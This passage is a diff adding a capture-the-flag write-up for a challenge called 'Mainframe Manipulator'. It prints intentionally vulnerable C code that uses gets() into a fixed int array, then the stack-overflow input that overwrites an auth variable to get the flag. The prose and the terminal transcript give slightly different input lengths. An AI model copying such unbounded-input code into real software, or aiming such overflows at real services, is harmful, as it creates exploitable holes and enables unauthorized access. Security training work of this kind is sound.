@@ -162,3 +162,106 @@ The most common are supervisory control and data acquisition (SCADA) systems and
 We can then assume that ICS stand for *Industrial Control Systems* - the difficult part of this challenge is to find how out how to format the flag. I just went through some trial and error and eventually got the flag.
 
 `HKN{industrial_control_systems}`
+
+## Mainframe Manipulator
+>Triangulation large-scale multiprocess mainframe computer location..
+
+In this challenge you are provided with the source code of the mainframe and a hauukins instance, where you can run the "mainframe-manipulator" `nc mainframe-manipulator.hkn 8080.`
+
+We are also provide with 2 hints:
+Hint 1
+- Remember that an int i 4 bytes
+- INT [4]
+Hint 2
+- a (0x61)
+- b (0x62)
+- c (0x63)
+
+The source code of the **mainframe**
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+void connect();
+
+int main() {   
+    int PIN[4];
+    int auth = 0;
+
+    while (1) {
+        connect();
+
+        printf("\nEnter PIN code: ");
+        gets(PIN);
+
+        if (auth == 0x62626363) {
+            printf("Access granted!\n");
+            system("cat flag.txt");
+            return EXIT_SUCCESS;
+        } else {
+            printf("Access denied! (auth: 0x%04x)\n\n", auth);
+        }
+        sleep(1);
+    }
+
+    return EXIT_SUCCESS;
+}
+
+void connect() {
+    printf("Establishing connection to mainframe...\n");
+    
+    putchar('[');
+    fflush(stdout);
+    for (int i = 0; i < 20; i++){
+        putchar('#');
+        usleep(50000);
+        fflush(stdout);
+    }
+
+    putchar(']');
+    printf(" Authentication required!");
+}
+
+```
+
+When you access the mainframe you are greeted with the following:
+```bash
+Establishing connection to mainframe...
+[####################] Authentication required!
+Enter PIN code: 
+```
+From the source code we can deduct that to access the mainframe we have to figure how to get `(auth == 0x62626363)` to get authorized.
+
+If we try to just input the password, the terminal will return the following, showing the password doesn't match the auth variable.
+
+```bash
+Establishing connection to mainframe...
+[####################] Authentication required!
+Enter PIN code: bbcc
+Access denied! (auth: 0x0000)
+
+```
+I tried to smash the buttons to see if I could provoke an error.  From the output below it becomes apparent that after letter number 15, it seems to include the letter in the form of `(auth : 0x0061)` so it seems to be vulnerable to a buffer overflow attack. Accordingly to ChatGPT its because the `gets(PIN)` command in the sourcecode doesn't perform a bounds check on the input.
+
+>If an attacker can input more than 4 characters and overwrite the auth variable, they can potentially set auth to the desired value (in this case, 0x62626363) and bypass the authentication check, leading to unauthorized access.
+
+And since there are no check on how many characters we can input, we can then perform the buffer overflow attack.
+
+```bash
+Establishing connection to mainframe...
+[######a##############] Authentication required!
+Enter PIN code: aaaaaaaaaaaaaaaa
+Access denied! (auth: 0x0061)
+```
+From this point when we have become aware of the buffer overflow attack, its just a simple of matching the auth so it returns `0x62626363` to do that, we input `aaaaaaaaaaaaaaaaccbb` in the terminal.
+
+```bash
+Establishing connection to mainframe...
+[####################] Authentication required!
+Enter PIN code: aaaaaaaaaaaaaaaaaccbb
+Access granted!
+HKN{y0u-4re-1n-th3-m4infr4m3}  
+```
+The mainframe now returns the flag.
+`HKN{y0u-4re-1n-th3-m4infr4m3}`
